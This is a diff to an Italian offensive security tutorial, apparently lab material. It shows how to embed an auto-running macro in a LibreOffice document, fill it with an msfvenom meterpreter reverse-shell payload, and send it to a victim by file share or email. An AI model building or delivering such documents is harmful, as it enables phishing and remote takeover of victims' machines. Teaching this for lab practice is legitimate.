@@ -147,6 +147,73 @@ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST = <I
 ```
 
 Il comando genera una macro VBA da copiare nel documento Office tramite l'editor per le macro, e il payload vero e proprio che invece deve essere copiato nel documento.
+
+Utilizziamo LibreOffice e creiamo un nuovo documento dove inserire la macro.
+
+Passaggio 1: Crea un nuovo documento
+
+Apri LibreOffice Writer.
+
+Vai su File → Nuovo → Documento di testo.
+
+Passaggio 2: Apri l’ambiente di sviluppo LibreOffice Basic (IDE)
+
+Vai su Strumenti → Macro → Organizza macro → LibreOffice Basic → Modifica.
+
+Assicurati che il nuovo documento sia selezionato nell’albero a sinistra.
+
+Se non esiste ancora un modulo, creane uno:
+
+Clicca su Standard → Nuovo modulo.
+
+Assegnagli un nome (ad esempio, Modulo1).
+
+Passaggio 3: Crea la macro AutoOpen
+
+Nel modulo, scrivi qualcosa come questo:
+
+Sub AutoOpen
+    MsgBox "Ciao! Il documento è stato aperto!"
+End Sub
+
+
+Questa è una semplice macro di test. Puoi sostituire la riga MsgBox con qualsiasi codice desideri venga eseguito all’apertura del documento.
+
+Passaggio 4: Assegna la macro all’apertura del documento
+
+LibreOffice non riconosce automaticamente AutoOpen. Devi assegnarla all’evento Apri documento:
+
+Vai su Strumenti → Personalizza → Eventi.
+
+Nella sezione Eventi del documento, seleziona Apri documento.
+
+Clicca su Macro….
+
+Naviga fino alla tua macro nell’elenco (ad esempio, Standard → Modulo1 → AutoOpen) e clicca su OK.
+
+Clicca di nuovo su OK per salvare l’assegnazione dell’evento.
+
+Passaggio 5: Salva il documento con macro abilitate
+
+Vai su File → Salva con nome.
+
+Scegli Documento di testo ODF (.odt).
+(Le macro vengono incorporate automaticamente nei file .odt.)
+
+Clicca su Salva.
+
+Passaggio 6: Testa la macro
+
+Chiudi il documento.
+
+Riaprilo.
+
+La macro AutoOpen dovrebbe eseguirsi (in questo esempio, verrà visualizzata una finestra di messaggio).
+
+Copiate la macro AutoOpen generata da msfvenom dentro al documento e poi copiate all'interno del documento il payload codificato. 
+
+Salvate il documento 
+
 Per completare l'attacco dovete condividere il documento con la vittima e.g usando Dropbox o Google Drive o inviarlo come allegato ad un'email.
 
 ## Creare un eseguibile malevolo per Metasploitable 2
